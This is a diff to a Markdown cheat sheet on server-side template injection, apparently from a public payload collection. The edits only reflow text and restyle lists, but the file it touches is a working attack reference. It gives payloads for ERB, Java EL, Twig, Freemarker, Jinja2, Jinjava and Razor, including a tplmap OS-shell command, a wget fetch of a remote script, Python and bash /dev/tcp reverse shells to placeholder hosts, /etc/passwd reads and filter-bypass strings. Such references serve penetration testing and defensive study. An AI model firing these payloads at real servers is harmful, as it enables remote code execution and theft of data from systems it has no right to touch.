@@ -1,60 +1,62 @@
 # Templates Injections
 
-> Template injection allows an attacker to include template code into an existant (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages
+> Template injection allows an attacker to include template code into an
+> existant (or not) template. A template engine makes designing HTML pages
+> easier by using static template files which at runtime replaces
+> variables/placeholders with actual values in the HTML pages
 
 ## Summary
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-* [Ruby](#ruby)
-  * [Basic injections](#basic-injections)
-  * [Retrieve /etc/passwd](#retrieve--etc-passwd)
-  * [List files and directories](#list-files-and-directories)
-* [Java](#java)
-  * [Basic injection](#basic-injection)
-  * [Retrieve the system’s environment variables](retrieve-the-system-s-environment-variables)
-  * [Retrieve /etc/passwd](#retrieve--etc-passwd)
-* [Expression Language EL](#expression-language-el)
-  * [Basic injection](#basic-injection)
-  * [Code execution](#code-execution)
-* [Twig](#twig)
-  * [Basic injection](#basic-injection)
-  * [Template format](#template-format)
-  * [Arbitrary File Reading](#arbitrary-file-reading)
-  * [Code execution](#code-execution)
-* [Smarty](#smarty)
-* [Freemarker](#freemarker)
-  * [Basic injection](#basic-injection)
-  * [Code execution](#code-execution)
-* [Peeble](#peeble)
-  * [Basic injection](#basic-injection)
-  * [Code execution](#code-execution)
-* [Jade / Codepen](#jade---codepen)
-* [Velocity](#velocity)
-* [Mako](#mako)
-* [Jinja2](#jinja2)
-  * [Basic injection](#basic-injection)
-  * [Template format](#template-format)
-  * [Debug Statement](#debug-statement)
-  * [Dump all used classes](#dump-all-used-classes)
-  * [Dump all config variables](#dump-all-config-variables)
-  * [Read remote file](#read-remote-file)
-  * [Write into remote file](#write-into-remote-file)
-  * [Remote Code Execution](#remote-code-execution)
-  * [Filter bypass](filter-bypass)
-* [Jinjava](#jinjava)
-  * [Basic injection](#basic-injection)
-  * [Command execution](#command-execution)
-* [Handlebars](#handlebars)
-* [ASP.NET Razor](#aspnet-razor)
-  * [Basic injection](#basic-injection)
-  * [Command execution](#command-execution)
-* [References](#references)
+- [Tools](#tools)
+- [Methodology](#methodology)
+- [Ruby](#ruby)
+  - [Basic injections](#basic-injections)
+  - [Retrieve /etc/passwd](#retrieve--etc-passwd)
+  - [List files and directories](#list-files-and-directories)
+- [Java](#java)
+  - [Basic injection](#basic-injection)
+  - [Retrieve the system’s environment variables](retrieve-the-system-s-environment-variables)
+  - [Retrieve /etc/passwd](#retrieve--etc-passwd)
+- [Expression Language EL](#expression-language-el)
+  - [Basic injection](#basic-injection)
+  - [Code execution](#code-execution)
+- [Twig](#twig)
+  - [Basic injection](#basic-injection)
+  - [Template format](#template-format)
+  - [Arbitrary File Reading](#arbitrary-file-reading)
+  - [Code execution](#code-execution)
+- [Smarty](#smarty)
+- [Freemarker](#freemarker)
+  - [Basic injection](#basic-injection)
+  - [Code execution](#code-execution)
+- [Peeble](#peeble)
+  - [Basic injection](#basic-injection)
+  - [Code execution](#code-execution)
+- [Jade / Codepen](#jade---codepen)
+- [Velocity](#velocity)
+- [Mako](#mako)
+- [Jinja2](#jinja2)
+  - [Basic injection](#basic-injection)
+  - [Template format](#template-format)
+  - [Debug Statement](#debug-statement)
+  - [Dump all used classes](#dump-all-used-classes)
+  - [Dump all config variables](#dump-all-config-variables)
+  - [Read remote file](#read-remote-file)
+  - [Write into remote file](#write-into-remote-file)
+  - [Remote Code Execution](#remote-code-execution)
+  - [Filter bypass](filter-bypass)
+- [Jinjava](#jinjava)
+  - [Basic injection](#basic-injection)
+  - [Command execution](#command-execution)
+- [Handlebars](#handlebars)
+- [ASP.NET Razor](#aspnet-razor)
+  - [Basic injection](#basic-injection)
+  - [Command execution](#command-execution)
+- [References](#references)
 
 ## Tools
 
-Recommended tool: [Tplmap](https://github.com/epinna/tplmap)
-e.g:
+Recommended tool: [Tplmap](https://github.com/epinna/tplmap) e.g:
 
 ```powershell
 python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
@@ -106,7 +108,6 @@ Execute code using SSTI for ERB engine.
 <% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
 ```
 
-
 Execute code using SSTI for Slim engine.
 
 ```powershell
@@ -144,12 +145,11 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 ### Basic injection
 
 ```java
-${1+1} 
+${1+1}
 #{1+1}
 ```
 
 ### Code Execution
-
 
 ```java
 // Common RCE payloads
@@ -178,7 +178,6 @@ ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().g
 // Method using ScriptEngineManager
 ${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
 ```
-
 
 ## Twig
 
@@ -239,7 +238,8 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 ## Freemarker
 
-You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)
+You can try your payloads at
+[https://try.freemarker.apache.org](https://try.freemarker.apache.org)
 
 ### Basic injection
 
@@ -313,7 +313,10 @@ ${x}
 ## Jinja2
 
 [Official website](http://jinja.pocoo.org/)
-> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
+
+> Jinja2 is a full featured template engine for Python. It has full unicode
+> support, an optional integrated sandboxed execution environment, widely used
+> and BSD licensed.
 
 ### Basic injection
 
@@ -323,8 +326,8 @@ ${x}
 {{config.items()}}
 ```
 
-Jinja2 is used by Python Web Frameworks such as Django or Flask.
-The above injections have been tested on Flask application.
+Jinja2 is used by Python Web Frameworks such as Django or Flask. The above
+injections have been tested on Flask application.
 
 ### Template format
 
@@ -342,7 +345,9 @@ The above injections have been tested on Flask application.
 
 ### Debug Statement¶
 
-If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.
+If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump
+the current context as well as the available filters and tests. This is useful
+to see what’s available to use in the template without setting up a debugger.
 
 ```python
 <pre>{% debug %}</pre>
@@ -390,6 +395,7 @@ nv -lnvp 8000
 ```
 
 #### Exploit the SSTI by calling subprocess.Popen.
+
 :warning: the number 396 will vary depending of the application.
 
 ```python
@@ -403,8 +409,10 @@ nv -lnvp 8000
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
-Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113)
-In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
+Simply modification of payload to clean up output and facilitate command input
+(https://twitter.com/SecGus/status/1198976764351066113) In another GET parameter
+include a variable named "input" that contains the command you want to run (For
+example: &input=ls)
 
 ```python
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
@@ -414,15 +422,14 @@ In another GET parameter include a variable named "input" that contains the comm
 
 ```python
 # evil config
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
 
 # load the evil config
-{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
 
 # connect to evil host
-{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
 ```
-
 
 ### Filter bypass
 
@@ -457,7 +464,9 @@ Bypassing `|join`
 http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
 ```
 
-Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:
+Bypassing most common filters ('.','\_','|join','[',']','mro' and 'base') by
+https://twitter.com/SecGus:
+
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
@@ -471,9 +480,10 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 {{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
 ```
 
-Jinjava is an open source project developped by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
+Jinjava is an open source project developped by Hubspot, available at
+[https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
 
-### Command execution 
+### Command execution
 
 Fixed by https://github.com/HubSpot/jinjava/pull/230
 
@@ -527,7 +537,7 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 @(1+2)
 ```
 
-### Command execution 
+### Command execution
 
 ```csharp
 @{
@@ -537,20 +547,20 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 
 ## References
 
-* [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
-* [Yahoo! RCE via Spring Engine SSTI](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/)
-* [Ruby ERB Template injection - TrustedSec](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
-* [Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
-* [PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
-* [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/)
-* [Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 • By phosphore](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
-* [RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug](https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad)
-* [RCE in Hubspot with EL injection in HubL - @fyoorer](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw)
-* [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
-* [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
-* [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
-* [Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
-* [Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
-* [Expression Language injection - PortSwigger](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
-* [Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab](https://securitylab.github.com/research/bean-validation-RCE)
-* [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
+- [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
+- [Yahoo! RCE via Spring Engine SSTI](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/)
+- [Ruby ERB Template injection - TrustedSec](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
+- [Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
+- [PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
+- [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/)
+- [Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 • By phosphore](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
+- [RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug](https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad)
+- [RCE in Hubspot with EL injection in HubL - @fyoorer](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw)
+- [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
+- [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
+- [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
+- [Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
+- [Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020](<https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/>)
+- [Expression Language injection - PortSwigger](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
+- [Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab](https://securitylab.github.com/research/bean-validation-RCE)
+- [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
